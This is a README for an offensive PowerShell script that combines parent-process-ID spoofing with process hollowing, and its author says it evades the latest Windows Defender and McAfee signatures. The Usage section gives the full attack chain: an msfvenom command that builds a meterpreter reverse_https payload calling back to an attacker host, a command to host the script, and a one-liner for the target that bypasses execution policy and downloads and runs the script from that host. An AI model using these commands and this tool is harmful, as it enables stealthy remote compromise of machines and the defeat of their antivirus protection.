# PPID ⧓ ProcHollow
**A powershell script that performs parent process ID (PPID) spoofing and process hollowing to evade Windows Defender**

```
                                        _____  _____ _____ _____                            
                                       |  __ \|  __ \_   _|  __ \                           
                                       | |__) | |__) || | | |  | |                          
           ((((((((*                   |  ___/|  ___/ | | | |  | |              /#######(         
        (((((((((((((((,               | |    | |    _| |_| |__| |              *##############(      
       ((((((((((((((((((((            |_|    |_|   |_____|_____/           .##################((     
      (((((((((((((((((((((((((                                         ######################(((    
      (((((((((((((((((((((((((((((     **                   /,     ##########################(((    
      ((((((((((((((((((((((((((((((((,     ************,,,     *#############################(((    
      ((((((((((((((((  ,(((((((((((((((,   ************,,,   ###############(,  #############(((    
      (((((((((((((((*                      ************,,,   ,                  (############(((    
      ((((((((((((((((((((((((((((((,       ************,,,       ,###########################(((    
      ((((((((((((((((((((((((((((((((((,   ************,,,   ################################(((    
      (((((((((((((((((((((((((((((.        ************,,,        ,(#########################(((    
      (((((((((((((((*                 ,.   ***********,,,,   /,                 #############(((    
      (((((((((((((((( ,((((((((((((((((,   ,,,,,,,,,,,,,,,   (((##############, #############(((    
      ((((((((((((((((((((((((((((((((      ,,,,,,,,,,,,,,,      ((((########################((((    
      ((((((((((((((((((((((((((((.     **                   /*     *((((###################(((((    
      ((((((((((((((((((((((((/     *///                      .///,     ((((#############((((((((    
       ((((((((((((((((((((     .////*                           /////      ((((((((((((((((((((     
        (((((((((((((((      //**.                                   ,**//      ((((((((((((((/      
           *(((((((        _____                _    _       _ _                      .(((((((.         
                          |  __ \              | |  | |     | | |              
                          | |__) | __ ___   ___| |__| | ___ | | | _____      __
                          |  ___/ '__/ _ \ / __|  __  |/ _ \| | |/ _ \ \ /\ / /
                          | |   | | | (_) | (__| |  | | (_) | | | (_) \ V  V / 
                          |_|   |_|  \___/ \___|_|  |_|\___/|_|_|\___/ \_/\_/  
```

The script has been hardcoded to search for a parent process (svchost.exe) that matches the current logged on user's privilege and spawns a child process (taskhostw.exe). Feel free to edit the script to take in arguments

*I developed the v1.0 script and have been using it since OSEP days... but it recently triggered an alert for Windows Defender. Decided to improve it to evade again, enjoy script v1.1😀*

## Demo Video
YouTube (higher resolution): https://www.youtube.com/watch?v=GB59m-KJvd0
![Alt text](480.gif?raw=true "Demo")

## Usage
1. Generate msfvenom payload
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f ps1`
2. Search for `Your payload here` in the script and replace it with the generated payload
3. Host the script on your kali `python3 -m http.server 8088`
4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/PPIDxProcHollow_v1.1.ps1')`

## Disclaimer
The usage section might make it seem like a 'fileless' approach but it **does write temporarly artifacts to disk**. I know disk is lava🔥 but writing it this way seems to evade Window Defender/FireEye/McAfee😨

## Evading Windows Defender
- The v1.0 script creates an alert on Windows Defender upon launching cmd.exe from meterpreter shell. However, your meterpreter shell will still be **kept alive** despite the alert.
- The v1.1 script eradicates the issue of v1.0 and it also makes the process looks more legitimate by spawning it under another parent process through PPID Spoofing. However, EWT can still catch PPID Spoofing method.
- The v1.1 script has been tested on the latest Windows Defender (updated before testing the script)
    ![Alt text](WinDefSignatureUpdate.png?raw=true "Windows Defender using latest signature version")
- The v1.1 script has been tested on McAfee too
![Alt text](EvadeMcAfee.png?raw=true "McAfee")

## Change Logs
2022-12-10 -- v1.1
   - Integrated with PPID spoofing
   - Evading latest Windows Defender again as of 10 Dec 2022

2021-09-18 -- v1.0
   - Simple Process Hollowing
   - Windows Defender alert pop up when launch cmd.exe but our meterpreter shell will not die


